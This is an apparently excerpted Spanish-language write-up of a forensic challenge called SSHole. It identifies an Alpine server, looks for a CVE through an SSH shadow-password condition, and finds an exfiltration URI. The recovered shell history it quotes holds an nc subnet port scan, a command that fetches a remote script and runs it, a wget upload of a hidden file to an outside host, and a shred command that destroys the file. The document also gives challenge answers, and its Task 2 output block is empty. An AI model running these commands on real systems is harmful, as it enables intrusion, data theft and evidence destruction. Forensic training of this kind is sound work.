## Task 1

<Callout type="question" title="Task 1">
  What Linux distribution name and version was the targeted server running?
</Callout>

Para saber el nombre y versión de la distribución de Linux leemos el archivo `SSHole/etc/os-release`

```bash
cat etc/os-release
```

```plaintext
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.3
PRETTY_NAME="Alpine Linux v3.24"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
```

## Task 2

<Callout type="question" title="Task 2">
  What is the CVE ID of the vulnerability abused by the attacker to gain access?
</Callout>

Hacemos una búsqueda en Google de vulnerabilidades en la versión de la distribución de Linux más la pista en el nombre del sherlock `sshole` ya que según yo no hay otras pistas ni información que hasta el momento ayuden a dar con el CVE.

Para verificar la vulnerabilidad, abrimos el archivo `SSHole/etc/shadow` para ver si se cumple la condición que debe existir por lo menos una cuenta para iniciar sesión por SSH cuyo campo de contraseña sea exactamente `*`.

```bash
cat etc/shadow
```

```bash

```

## Task 7

<Callout type="question" title="Task 7">
  What was the exfiltration URI where the attacker exfiltrated a sensitive file?
</Callout>

De acuerdo a los logs de comandos ejecutados por el atacante encontramos que realizó una request por POST enviando el archivo oculto `/tmp/.devenv` a la URI indicada.

```bash
cat home/adminsvc/.ash_history
```

```plaintext
ls -la
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
vi scanreport.txt
cat scanreport.txt
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
ls -la /tmp
ls -l /tmp/.devenv
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
exit
```

<Callout type="success" title="URI">
  https://devv.coding.eu/process
</Callout>
